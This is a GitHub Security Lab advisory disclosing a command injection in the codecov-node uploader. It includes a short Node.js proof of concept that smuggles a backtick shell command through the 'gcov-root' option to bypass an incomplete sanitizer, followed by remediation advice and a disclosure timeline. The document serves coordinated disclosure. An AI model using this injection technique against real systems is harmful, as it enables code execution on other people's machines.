<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 31, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-109: Command injection in codecov</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930?s=35" height="35" width="35">
        <span>GitHub Security Lab</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>The <code class="language-plaintext highlighter-rouge">upload</code> method has a command injection vulnerability. Clients of the <code class="language-plaintext highlighter-rouge">codecov-node</code> library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.</p>

<h2 id="product">Product</h2>
<p>Codecov NodeJS Uploader</p>

<h2 id="tested-version">Tested Version</h2>
<p>Commit <a href="https://github.com/codecov/codecov-node/tree/eeff4e1953bffd2a3840322764bd5c8c9d3a91f4">eeff4e1</a>.</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-command-injection-in-upload">Issue 1: Command injection in <code class="language-plaintext highlighter-rouge">upload</code></h3>

<p>The following proof-of-concept illustrates the vulnerability. First install codecov:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install codecov
</code></pre></div></div>

<p>Now create a file with the following contents:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var root = require("codecov");
var args = {
  "options": {
    'gcov-root': "` touch exploit `",
    'gcov-exec': ' ',
    'gcov-args': ' '
  }
}
root.handleInput.upload(args, function(){}, function(){});
</code></pre></div></div>

<p>and run it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node test.js
</code></pre></div></div>

<p>Notice that a file named <code class="language-plaintext highlighter-rouge">exploit</code> has been created.</p>

<p>Note: we are aware of <a href="https://github.com/advisories/GHSA-5q88-cjfq-g2mh">CVE-2020-7597</a>, but the fix was incomplete. It only blocked <code class="language-plaintext highlighter-rouge">&amp;</code>, but our PoC uses backticks instead to bypass the sanitizer.</p>

<p>We have written a <a href="https://codeql.com">CodeQL</a> query, which automatically detects this vulnerability. You can see the results of the query on the <code class="language-plaintext highlighter-rouge">codecov-node</code> project <a href="https://lgtm.com/query/7714424068617023832/">here</a>.</p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.</p>

<h4 id="remediation">Remediation</h4>

<p>We recommend not using an API that can interpret a string as a shell command. For example, use <a href="https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback"><code class="language-plaintext highlighter-rouge">child_process.execFile</code></a> instead of <a href="https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback"><code class="language-plaintext highlighter-rouge">child_process.exec</code></a>.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2020-05-19: Emailed report to jwbecher@drazisil.com</li>
  <li>2020-05-19: jwbecher asked me to resend the email to security@codecov.io</li>
  <li>2020-07-17: Fixed in version 3.7.1: https://github.com/codecov/codecov-node/security/advisories/GHSA-xp63-6vf5-xf3v</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub Engineer <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-109</code> in any communication regarding this issue.</p>

    